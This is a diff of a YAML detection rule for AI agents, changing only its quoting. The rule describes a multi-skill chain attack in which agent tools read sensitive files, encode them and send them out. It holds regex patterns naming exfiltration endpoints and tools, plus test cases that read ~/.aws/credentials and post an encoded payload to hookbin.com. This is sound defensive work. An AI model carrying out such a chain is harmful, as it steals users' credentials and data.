@@ -1,4 +1,4 @@
-title: 'Multi-Skill Chain Attack'
+title: "Multi-Skill Chain Attack"
 id: ATR-2026-063
 status: experimental
 description: >
@@ -7,22 +7,22 @@ description: >
   (1) a reconnaissance skill reads sensitive files, (2) an encoding skill obfuscates
   the data, (3) a network skill exfiltrates it. Each step appears benign individually
   but the chain constitutes data exfiltration.
-author: 'ATR Community'
-date: '2026/03/08'
-schema_version: '0.1'
+author: "ATR Community"
+date: "2026/03/08"
+schema_version: "0.1"
 detection_tier: pattern
 maturity: experimental
 severity: critical
 
 references:
   owasp_llm:
-    - 'LLM03:2025 - Supply Chain Vulnerabilities'
-    - 'LLM06:2025 - Excessive Agency'
+    - "LLM03:2025 - Supply Chain Vulnerabilities"
+    - "LLM06:2025 - Excessive Agency"
   owasp_agentic:
-    - 'ASI02:2026 - Tool Misuse and Exploitation'
+    - "ASI02:2026 - Tool Misuse and Exploitation"
   mitre_atlas:
-    - 'AML.T0024 - Exfiltration via ML Inference API'
-    - 'AML.T0053 - LLM Plugin Compromise'
+    - "AML.T0024 - Exfiltration via ML Inference API"
+    - "AML.T0053 - LLM Plugin Compromise"
 
 tags:
   category: tool-poisoning
@@ -52,12 +52,12 @@ detection:
       value: "(?i)(webhook|ngrok|requestbin|pipedream|hookbin|burpcollaborator|interact\\.sh|oast)"
     - field: tool_name
       operator: regex
-      value: '(?i)(send[_-]?(email|message|webhook|http|request)|upload|post[_-]?data|transmit|exfil)'
+      value: "(?i)(send[_-]?(email|message|webhook|http|request)|upload|post[_-]?data|transmit|exfil)"
   condition: any
   false_positives:
-    - 'Legitimate backup or migration workflows that read, compress, and transfer files'
-    - 'CI/CD pipelines that encode artifacts for deployment'
-    - 'Monitoring tools that send alerts via webhooks'
+    - "Legitimate backup or migration workflows that read, compress, and transfer files"
+    - "CI/CD pipelines that encode artifacts for deployment"
+    - "Monitoring tools that send alerts via webhooks"
 
 response:
   actions:
@@ -74,23 +74,23 @@ response:
 test_cases:
   true_positives:
     - input:
-        tool_name: 'file_reader'
+        tool_name: "file_reader"
         tool_args: '{"path": "/home/user/.aws/credentials"}'
       expected: triggered
-      matched_condition: 'reading sensitive credential file'
+      matched_condition: "reading sensitive credential file"
     - input:
-        tool_name: 'send_webhook'
+        tool_name: "send_webhook"
         tool_args: '{"url": "https://hookbin.com/abc123", "data": "encoded_payload"}'
       expected: triggered
-      matched_condition: 'sending data to known exfiltration endpoint'
+      matched_condition: "sending data to known exfiltration endpoint"
   true_negatives:
     - input:
-        tool_name: 'file_reader'
+        tool_name: "file_reader"
         tool_args: '{"path": "/home/user/documents/report.pdf"}'
       expected: not_triggered
-      reason: 'Reading a normal user document'
+      reason: "Reading a normal user document"
     - input:
-        tool_name: 'email_sender'
+        tool_name: "email_sender"
         tool_args: '{"to": "team@company.com", "subject": "Meeting notes"}'
       expected: not_triggered
-      reason: 'Sending normal business email'
+      reason: "Sending normal business email"
